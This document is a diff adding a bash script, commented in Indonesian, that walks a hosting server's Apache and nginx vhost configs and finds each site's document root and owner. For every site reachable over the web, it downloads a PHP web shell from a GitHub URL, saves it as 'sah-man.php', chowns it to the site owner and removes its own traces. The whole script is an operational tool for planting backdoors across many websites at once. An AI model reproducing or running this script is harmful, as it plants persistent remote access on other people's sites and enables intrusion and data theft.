@@ -1,0 +1,244 @@
+#!/bin/bash
+
+TESTFILE="test123zz.txt"
+SHELL_URL="https://raw.githubusercontent.com/rexorid/shell/refs/heads/main/ENC/rexbydec.php"
+SHELL_NAME="sah-man.php"
+echo "TESTPAGE_$(date +%s)" > "/tmp/$TESTFILE"
+
+# ---------- helper: extract domain dari config ----------
+extract_domain() {
+    local config_file="$1"
+    local domain=""
+
+    if [ -f "$config_file" ]; then
+        domain=$(grep -i "^[[:space:]]*ServerName" "$config_file" | head -1 | awk '{print $2}')
+        if [ -z "$domain" ]; then
+            domain=$(grep -i "^[[:space:]]*server_name" "$config_file" | head -1 | sed 's/.*server_name//' | awk '{print $1}' | tr -d ';')
+        fi
+        if [ -z "$domain" ]; then
+            domain=$(basename "$config_file" | sed 's/\.conf$//' | sed 's/\.ssl$//')
+        fi
+    fi
+
+    echo "$domain"
+}
+
+# ---------- helper: tentukan user + doc_root + subdomain path ----------
+# Output: "<user>|<doc_root>|<subdomain_dir>"
+resolve_paths() {
+    local domain="$1"
+    local config_file="$2"
+    local user=""
+    local doc_root=""
+    local subdir=""
+
+    # --- 1. Dari config (DocumentRoot / root) ---
+    if [ -f "$config_file" ]; then
+        doc_root=$(grep -i "^[[:space:]]*DocumentRoot" "$config_file" | head -1 | awk '{print $2}' | tr -d '"')
+        if [ -z "$doc_root" ]; then
+            doc_root=$(grep -i "^[[:space:]]*root" "$config_file" | head -1 | sed 's/.*root//' | awk '{print $1}' | tr -d ';')
+        fi
+    fi
+
+    # --- 2. Ambil user dari pola /home/<user>/... ---
+    if [ -n "$doc_root" ]; then
+        if [[ "$doc_root" =~ ^/home/([^/]+)/ ]]; then
+            user="${BASH_REMATCH[1]}"
+        fi
+    fi
+
+    # --- 3. Kalau doc_root belum ada, cari di /home/*/public_html ---
+    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then
+        for user_dir in /home/*/; do
+            if [ -d "${user_dir}public_html" ]; then
+                doc_root="${user_dir}public_html"
+                user=$(basename "$user_dir")
+                break
+            fi
+        done
+    fi
+
+    # --- 4. Fallback: pakai prefix domain sebagai username ---
+    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then
+        local u=$(echo "$domain" | cut -d'.' -f1)
+        if [ -d "/home/$u/public_html" ]; then
+            user="$u"
+            doc_root="/home/$u/public_html"
+        fi
+    fi
+
+    # --- 5. Deteksi subdomain: kalau doc_root BUKAN public_html langsung ---
+    #     contoh: /home/user/public_html/new.nblsl.com  -> subdir = new.nblsl.com
+    #     contoh: /home/user/domain.com/public         -> subdir = domain.com/public
+    if [ -n "$user" ] && [ -n "$doc_root" ]; then
+        local base="/home/$user/"
+        local rest="${doc_root#$base}"
+        # kalau bukan pas "public_html" saja, simpan subpathnya
+        if [ "$rest" != "public_html" ] && [ "$rest" != "public_html/" ]; then
+            subdir="$rest"
+        fi
+    fi
+
+    echo "${user}|${doc_root}|${subdir}"
+}
+
+# ---------- kumpulkan domain ----------
+declare -A domains_map
+declare -a domains_list
+
+if [ -d "/usr/local/apache/conf.d/vhosts/" ]; then
+    for config in /usr/local/apache/conf.d/vhosts/*.conf; do
+        [ -f "$config" ] || continue
+        d=$(extract_domain "$config")
+        if [ -n "$d" ]; then
+            domains_map["$d"]="$config"
+            domains_list+=("$d")
+        fi
+    done
+fi
+
+if [ -d "/etc/nginx/conf.d/vhosts/" ]; then
+    for config in /etc/nginx/conf.d/vhosts/*.conf; do
+        [ -f "$config" ] || continue
+        d=$(extract_domain "$config")
+        if [ -n "$d" ] && [ -z "${domains_map[$d]}" ]; then
+            domains_map["$d"]="$config"
+            domains_list+=("$d")
+        fi
+    done
+fi
+
+if [ ${#domains_list[@]} -eq 0 ]; then
+    echo "No domains found in vhost configurations"
+    rm -f "/tmp/$TESTFILE"
+    exit 1
+fi
+
+echo "Found ${#domains_list[@]} domains to check"
+echo "----------------------------------------"
+
+# ---------- variabel rekap ----------
+declare -a OK_TEST
+declare -a FAIL_TEST
+declare -a OK_SHELL
+declare -a FAIL_SHELL
+
+# ---------- proses tiap domain ----------
+for domain in "${domains_list[@]}"; do
+    config_file="${domains_map[$domain]}"
+
+    IFS='|' read -r user doc_root subdir <<< "$(resolve_paths "$domain" "$config_file")"
+
+    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then
+        echo "✗ $domain - document root not found"
+        FAIL_TEST+=("$domain (doc_root not found)")
+        continue
+    fi
+
+    # --- deteksi Laravel ---
+    LARAVEL=""
+    if [ -d "${doc_root}storage" ]; then
+        LARAVEL="yes"
+    fi
+
+    # --- copy file test ---
+    if [ -n "$LARAVEL" ]; then
+        if [ -d "${doc_root}public" ]; then
+            cp "/tmp/$TESTFILE" "${doc_root}public/" 2>/dev/null
+            test_path="${doc_root}public/${TESTFILE}"
+            target_dir="${doc_root}public"
+        else
+            echo "✗ $domain - Laravel public directory not found"
+            FAIL_TEST+=("$domain (Laravel public not found)")
+            continue
+        fi
+    else
+        cp "/tmp/$TESTFILE" "$doc_root/" 2>/dev/null
+        test_path="${doc_root}${TESTFILE}"
+        target_dir="$doc_root"
+    fi
+
+    # --- uji akses test file ---
+    accessible=""
+    url="https://${domain}/${TESTFILE}"
+    response=$(curl -s -L --max-time 10 --connect-timeout 5 -k "$url")
+    if echo "$response" | grep -q "TESTPAGE_"; then
+        accessible="https"
+        echo "✓ $domain - accessible (doc_root: $doc_root)"
+        OK_TEST+=("$domain (doc_root: $doc_root)")
+    else
+        url="http://${domain}/${TESTFILE}"
+        response=$(curl -s -L --max-time 10 --connect-timeout 5 -k "$url")
+        if echo "$response" | grep -q "TESTPAGE_"; then
+            accessible="http"
+            echo "✓ $domain - accessible (HTTP only, doc_root: $doc_root)"
+            OK_TEST+=("$domain (HTTP only, doc_root: $doc_root)")
+        else
+            echo "✗ $domain - not accessible (doc_root: $doc_root)"
+            FAIL_TEST+=("$domain (doc_root: $doc_root)")
+        fi
+    fi
+
+    # --- kalau accessible, upload shell ---
+    if [ -n "$accessible" ]; then
+        shell_path="${target_dir}/${SHELL_NAME}"
+
+        # download via wget
+        wget -q -O "$shell_path" "$SHELL_URL" 2>/dev/null
+        wget_rc=$?
+
+        # fallback curl kalau wget gagal
+        if [ $wget_rc -ne 0 ] || [ ! -s "$shell_path" ]; then
+            curl -s -L -k --max-time 20 -o "$shell_path" "$SHELL_URL" 2>/dev/null
+        fi
+
+        if [ -s "$shell_path" ]; then
+            # --- chown sesuai logic ---
+            # /home/{user}/{root_doc}/sah-man.php            -> user:user
+            # /home/{user}/{root_doc}/{subdomain.com}/sah-man.php -> user:user
+            if [ -n "$user" ] && id "$user" &>/dev/null; then
+                chown "${user}:${user}" "$shell_path" 2>/dev/null
+                chown_rc=$?
+            else
+                chown_rc=1
+            fi
+
+            if [ $chown_rc -eq 0 ]; then
+                echo "  ➜ shell uploaded & chowned: $shell_path (${user}:${user})"
+                OK_SHELL+=("$domain -> $shell_path")
+            else
+                echo "  ➜ shell uploaded but chown failed: $shell_path"
+                OK_SHELL+=("$domain -> $shell_path (chown failed)")
+            fi
+        else
+            echo "  ➜ shell upload FAILED: $shell_path"
+            FAIL_SHELL+=("$domain (upload failed: $shell_path)")
+        fi
+    fi
+
+    # --- hapus file test di doc root ---
+    rm -f "$test_path" 2>/dev/null
+done
+
+# ---------- cleanup semua file test123zz.txt di /tmp ----------
+rm -f "/tmp/$TESTFILE" 2>/dev/null
+# sapu bersih kalau masih ada sisa di doc root manapun
+find /home -maxdepth 5 -name "$TESTFILE" -type f -delete 2>/dev/null
+
+# ---------- rekap akhir ----------
+echo "----------------------------------------"
+echo "REKAP TEST FILE (test123zz.txt)"
+echo "  ✓ Accessible : ${#OK_TEST[@]}"
+for d in "${OK_TEST[@]}"; do echo "      - $d"; done
+echo "  ✗ Failed     : ${#FAIL_TEST[@]}"
+for d in "${FAIL_TEST[@]}"; do echo "      - $d"; done
+
+echo "----------------------------------------"
+echo "REKAP UPLOAD SHELL (sah-man.php)"
+echo "  ✓ Success    : ${#OK_SHELL[@]}"
+for d in "${OK_SHELL[@]}"; do echo "      - $d"; done
+echo "  ✗ Failed     : ${#FAIL_SHELL[@]}"
+for d in "${FAIL_SHELL[@]}"; do echo "      - $d"; done
+
+echo "----------------------------------------"
+echo "Done checking domains & uploading shells"
